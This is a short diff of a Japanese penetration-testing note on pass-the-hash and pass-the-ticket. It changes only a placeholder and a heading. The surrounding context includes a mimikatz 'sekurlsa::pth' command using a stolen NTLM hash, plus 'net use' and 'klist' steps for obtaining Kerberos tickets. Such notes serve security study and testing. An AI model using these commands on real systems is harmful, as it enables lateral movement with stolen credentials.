@@ -205,7 +205,7 @@ sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTHash> /run:powershell
 2. 開かれたPowerShellセッション上から、TGT・TGSの発行
 ```powershell
 # ターゲットホストのドメイン共有にアクセスすることでKerberos認証を発火
-net use \\[TargetHost] # →The command completed successfully.
+net use \\<target_host> # →The command completed successfully.
 
 # TGTの確認
 klist
@@ -244,7 +244,7 @@ klist
 
 ---
 
-# PtT(Pass-the-Ticket)
+# PtT (Pass-the-Ticket)
 
 ## PtTとは
 
